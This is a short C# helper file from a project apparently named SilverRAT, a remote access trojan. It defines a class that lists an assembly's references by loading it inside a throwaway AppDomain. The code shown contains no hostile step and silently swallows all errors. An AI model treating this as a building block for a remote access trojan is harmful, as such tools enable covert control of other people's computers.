using System;
using System.Globalization;
using System.Linq;
using System.Reflection;

namespace SilverRAT.Helper;

public class ReferenceLoader : MarshalByRefObject
{
    public string[] LoadReferences(string assemblyPath)
    {
        try
        {
            return (from x in Assembly.ReflectionOnlyLoadFrom(assemblyPath).GetReferencedAssemblies()
                    select x.FullName).ToArray();
        }
        catch
        {
            return null;
        }
    }

    public void AppDomainSetup(string assemblyPath)
    {
        try
        {
            AppDomain domain;
            domain = AppDomain.CreateDomain(info: new AppDomainSetup
            {
                ApplicationBase = AppDomain.CurrentDomain.BaseDirectory
            }, friendlyName: Guid.NewGuid().ToString(), securityInfo: null);
            ((ReferenceLoader)Activator.CreateInstance(domain, typeof(ReferenceLoader).Assembly.FullName, typeof(ReferenceLoader).FullName, ignoreCase: false, BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic, null, null, CultureInfo.CurrentCulture, new object[0]).Unwrap()).LoadReferences(assemblyPath);
            AppDomain.Unload(domain);
        }
        catch
        {
        }
    }
}
